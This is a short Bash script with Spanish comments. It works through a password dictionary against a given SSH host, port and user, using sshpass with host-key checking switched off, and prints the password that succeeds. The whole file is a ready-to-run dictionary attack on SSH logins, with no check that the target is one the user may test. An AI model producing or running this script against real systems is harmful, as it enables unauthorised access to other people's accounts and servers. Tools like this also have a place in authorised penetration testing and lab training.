#!/bin/bash

# Verificar el número de argumentos
if [ "$#" -ne 4 ]; then
    echo "Uso: $0 <IP> <puerto> <usuario> <ruta-del-diccionario>"
    exit 1
fi

IP=$1
PORT=$2
USER=$3
DICT_PATH=$4

# Verificar si el archivo del diccionario existe
if [ ! -f "$DICT_PATH" ]; then
    echo "El archivo del diccionario no existe: $DICT_PATH"
    exit 2
fi

# Iterar a través de cada contraseña en el diccionario
while read -r PASSWORD; do
    echo "Probando contraseña: $PASSWORD"
    # Utilizar sshpass para intentar la conexión
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p "$PORT" "$USER"@"$IP" id &>/dev/null

    # Verificar el resultado del último comando
    if [ $? -eq 0 ]; then
        echo "Contraseña encontrada: $PASSWORD"
        exit 0
    fi
done < "$DICT_PATH"

echo "La contraseña no se encontró en el diccionario."
exit 1

